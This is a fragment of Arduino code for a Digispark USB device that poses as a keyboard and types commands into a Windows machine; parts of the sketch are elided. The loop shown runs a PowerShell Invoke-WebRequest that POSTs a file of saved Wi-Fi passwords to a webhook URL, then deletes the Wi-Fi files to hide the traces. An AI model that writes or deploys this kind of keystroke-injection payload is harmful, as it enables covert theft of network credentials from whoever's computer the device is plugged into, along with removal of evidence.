...
void setup() {
  pinMode(PIN_LED, OUTPUT); //LED on Model A 
  analogWrite(PIN_LED,INTENSIDAD_LED);//activar el led de forma atenuada
}
...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri " WEBHOOK_URL " -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  digitalWrite(PIN_LED, LOW); //turn on led when program finishes  
